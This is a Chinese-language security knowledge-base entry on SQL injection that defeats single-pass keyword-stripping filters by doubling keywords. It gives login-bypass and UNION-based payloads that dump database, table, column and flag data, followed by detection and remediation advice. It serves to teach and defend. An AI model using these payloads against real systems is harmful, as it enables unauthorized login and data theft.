---
id: web-generic-sqli-keyword-double-write-bypass
title: SQL 注入：关键字被单次替换为空时用双写还原 select/or/and
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-keyword-double-write
tags:
- sqli
- waf-bypass
- keyword-filter
- double-write
- union
- login-bypass
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V12
  verified_at: '2026-11-05T01:51:02+08:00'
  notes: 双写拼写已修正并复核
url: /docs/web/generic/sqli/web-generic-sqli-keyword-double-write-bypass/
draft: false
kb_aliases:
- 双写绕过 SQL 过滤
- selselectect
- oorr anandd
- 关键字替换为空绕过
- SQL 注入双写
---

## 一句话结论

当后端对 SQL 关键字只做一次非递归的“替换为空”过滤（如把 `select`、`or`、`and` 直接删掉）时，把关键字写成 `selselectect`、`oorr`、`anandd`，过滤后正好还原为 `select`、`or`、`and`，从而绕过过滤完成登录绕过与 UNION 注入。

## 原理

- 过滤实现通常是 `str_replace('select', '', $input)` 或等价的单次 `preg_replace`；它从左到右扫描一次，不会对替换后的结果再次匹配。
- 输入 `selselectect` 中只有中间那个 `select` 会被删除，剩下前后两段拼成 `select`；`oorr` 删掉一次 `or` 后剩 `or`；`anandd` 同理。
- 这属于“过滤规则与被过滤内容不一致”：过滤器认为关键字已消失，数据库收到的却是完整关键字。
- 由于登录处通常把用户名/密码直接拼进 `WHERE`，`admin' oorr '1'='1` 过滤后变成 `admin' or '1'='1`，恒真条件使登录成功；注入点位于查询参数时，同样可用双写后的 `union select` 做联合查询。
- 若过滤还会删除注释符（`--`、`#`），可用 `anandd '1'='1` 这样的恒真条件收尾，避免依赖注释。

## 触发条件

- 应用对 SQL 关键字做黑名单过滤，但实现是单次替换/删除，且未递归、未做等价重写检测；
- 过滤大小写不敏感或只匹配小写，双写形式能进入 SQL；
- 存在可拼接的注入点（登录表单、搜索参数等），数据库错误或回显可用于判断列数。

## 利用步骤

1. 用 `'`、`and 1=1`、`and 1=2` 等探测注入点与过滤行为；观察哪些关键字被删、是否保留注释符。
2. 对每个被过滤的关键字构造双写形式：`select` → `selselectect`，`or` → `oorr`，`and` → `anandd`，`from`/`where` 等同理按实际过滤词处理。
3. 登录绕过：提交 `admin' oorr '1'='1`（密码任意）。
4. UNION 注入：先 `order by` 或 `union select 1,2,3,...` 确定列数，再用双写后的 `union select` 依次爆库名、表名、列名、数据。
5. 注释符被过滤时，用 `anandd '1'='1` 闭合剩余条件。

## PoC

```text
# 登录绕过
username=admin' oorr '1'='1
password=任意

# 爆库名（4 列）
id=0' union selselectect 1,database(),3,'4

# 爆表名
id=0' union selselectect 1,group_concat(table_name),3,4 from infoorrmation_schema.tables where table_schema=database() anandd '1'='1

# 爆列名
id=0' union selselectect 1,group_concat(column_name),3,4 from infoorrmation_schema.columns where table_name='secret' anandd '1'='1

# 取数据
id=0' union selselectect 1,group_concat(flag),3,4 from secret where '1'='1
```

## 变体与关联

- 关键字不只 `select/or/and`：`from`、`where`、`union`、`information_schema` 被过滤时可分别双写；若过滤同时删除 `or`，`information_schema` 要写成 `infoorrmation_schema`。
- 其它“替换为空”绕过：大小写混写、内联注释 `sel/**/ect`、URL 编码、等价函数（`||`/`&&`、`mid`/`substr`）。
- 关联：[[web-generic-sqli-metinfo-search-para-base64-blind]]（另一种过滤/编码绕过）；[[web-generic-sqli-exists-left-boolean-oracle]]（布尔盲注）。
- 影响边界：本例通过 UNION 直接回显数据库名、表名与 flag，属于完整的注入利用；真实目标可进一步读取管理员凭据或写入文件。

## 检测与防御

- 检测：请求参数中出现 `selselectect`、`oorr`、`anandd`、`infoorrmation_schema` 等重复子串；同一 IP 高频提交含 SQL 关键字变形的登录/搜索请求；数据库日志出现恒真条件或异常 UNION 查询。
- 修复：使用参数化查询/预编译，不把用户输入拼接进 SQL；过滤不能作为主要防御。
- 缓解：WAF 对重复关键字与变形做归一化匹配；统一大小写后再检测；限制数据库账号权限与错误回显。
